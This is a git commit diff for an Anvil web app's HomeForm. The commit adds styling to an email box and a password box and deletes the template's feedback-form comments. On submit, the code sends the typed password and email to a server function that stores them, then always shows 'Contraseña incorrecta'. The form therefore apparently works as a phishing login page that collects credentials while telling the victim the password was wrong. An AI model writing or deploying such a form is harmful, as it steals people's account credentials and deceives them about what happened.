99a782b376b322696def2cc6184504d0ea90e1e6
otero.valentin11@gmail.com <otero.valentin11@gmail.com>
2024-06-14 01:14:33 +0000

    Created custom_styles.css; Edited HomeForm

--- client_code/HomeForm/__init__.py
+++ client_code/HomeForm/__init__.py
@@ -5,26 +5,17 @@ import anvil.tables as tables
 import anvil.tables.query as q
 from anvil.tables import app_tables
 
-#
-# This is the Python code that makes this feedback form work.
-# It's a Python class, with a method that runs when the user
-# clicks the SUBMIT button.
-#
-# When the button is clicked, we send the contents of the
-# text boxes to our Server Module. The Server Module records
-# the feedback in the database, and sends an email to the
-# app's owner (that's you!).
-#
-# To find the Server Module, look under "Server Code" on the
-# left.
-#
-
-
 class HomeForm(HomeFormTemplate):
   def __init__(self, **properties):
     # Set Form properties and Data Bindings.
     self.init_components(**properties)
 
+    # Apply custom CSS class to the card
+    self.cad.role = 'custom-card'
+    self.cad.col_widths = 10
+    self.email_box.role = 'custom-input'
+    self.passwd_box.role = 'custom-input'
+    self.submit_button.role = 'custom-button'
     # Any code you write here will run when the form opens.
 
   def submit_button_click(self, **event_args):
@@ -32,13 +23,10 @@ class HomeForm(HomeFormTemplate):
     # First, we grab the contents of the text boxes:
     name = self.passwd_box.text
     email = self.email_box.text
-    
 
     # Now we call our Server Module to save our input
     # in the database and send you an email:
     anvil.server.call("add_feedback", name, email)
-    # (Hint: Find ServerModule1 under "Server Code" on the
-    # left. Click on the folder icon if you can't see it.)
 
     # Display something to the user so they know it worked:
     Notification("Contraseña incorrecta").show()
